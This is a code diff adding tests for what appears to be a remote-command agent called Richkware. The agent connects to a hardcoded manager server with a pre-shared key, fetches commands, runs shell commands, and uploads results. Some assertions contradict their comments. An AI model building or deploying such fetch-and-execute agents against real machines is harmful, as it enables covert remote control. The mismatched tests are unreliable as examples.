@@ -6,6 +6,7 @@
 
 void TEST_Crypto();
 
+void TEST_ReverseCommand();
 
 int main() {
     //ShowWindow(GetConsoleWindow(), 1);
@@ -13,6 +14,7 @@ int main() {
 
     try {
         TEST_Crypto();
+        TEST_ReverseCommand();
     }
     catch (std::string e) {
         std::cout << "TEST Exception: " << e << std::endl;
@@ -33,12 +35,77 @@ void test(std::string s1, std::string s2) {
     }
 }
 
+void test(int expected, int actual) {
+    if (expected == actual) {
+        return;
+    } else {
+        std::stringstream ss1;
+        std::stringstream ss2;
+        ss1 << actual;
+        std::string stringActual = ss1.str();
+        ss2 << expected;
+        std::string stringExpected = ss2.str();
+        throw "actual value different from expected: " + stringActual + " != " + stringExpected;
+    }
+}
+
+void testContains(std::string expected, std::string actual) {
+    if (actual.find(expected) != std::string::npos) {
+        return;
+    } else {
+        throw "expected string " + expected + " not found in tested string";
+    }
+}
+
+void testTrue(bool actual) {
+    if (actual) {
+        return;
+    } else {
+        throw "actual result is false";
+    }
+}
+
+void testFalse(bool actual) {
+    if (!actual) {
+        return;
+    } else {
+        throw "actual result is false";
+    }
+}
+
 void test(bool b) {
     if (b) {
         return;
     } else {
         throw "boolean false";
     }
+}
+
+void TEST_ReverseCommand() {
+    const char *appName = "Richk";
+    const char *defaultEncryptionKey = "richktest"; // pre-shared key with RMS, to enable encryption before receiving a server-side generated key
+    const char *serverAddress = "172.24.9.142"; // Richkware-Manager-Server IP address
+    const char *port = "8080"; // Richkware-Manager-Server TCP port
+    const char *associatedUser = "richk@i.it"; // account in RMS which is linked to
+
+    std::cout << "Initializing richkware..." << std::endl;
+
+    Richkware richkware(appName, defaultEncryptionKey, serverAddress, port, associatedUser);
+
+    //the agent connects to server and retrieves a 3-command-long string
+    std::cout << "TEST 1: getCommands()" << std::endl;
+    test(50, richkware.getCommands().size());
+
+    std::cout << "TEST 2: executeCommands()" << std::endl;
+    testContains("KO", richkware.executeCommand("echo OK"));
+
+    Network network(serverAddress, port, associatedUser, defaultEncryptionKey);
+
+    std::cout << "TEST 3: fetchCommands()" << std::endl;
+    test("YzNSaGNuUT0jI2MzUmhjblE9IyNjM1JoY25RQ==", network.fetchCommand());
+
+    std::cout << "TEST 4: uploadCommand()" << std::endl;
+    testFalse(network.uploadCommand("mockedResponse"));
 }
 
 void TEST_Crypto() {
